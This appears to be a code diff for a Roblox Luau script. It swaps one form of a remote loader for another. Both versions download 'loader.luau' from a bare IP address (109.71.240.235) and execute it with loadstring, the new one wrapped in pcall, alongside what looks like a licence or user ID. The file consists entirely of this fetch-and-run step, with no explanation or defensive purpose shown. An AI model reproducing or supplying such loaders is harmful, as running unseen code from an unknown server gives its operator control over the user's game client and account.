@@ -1,2 +1,6 @@
 ID="8899cc7c-9132-4b96-b903-a3f925fae39f";
-loadstring(game:HttpGet("http://109.71.240.235:391/cdn/loader.luau"))()
+local HttpService = game:GetService("HttpService")
+local code = HttpService:GetAsync("http://109.71.240.235:3910/cdn/loader.luau")
+
+local func = loadstring(code)
+pcall(func)
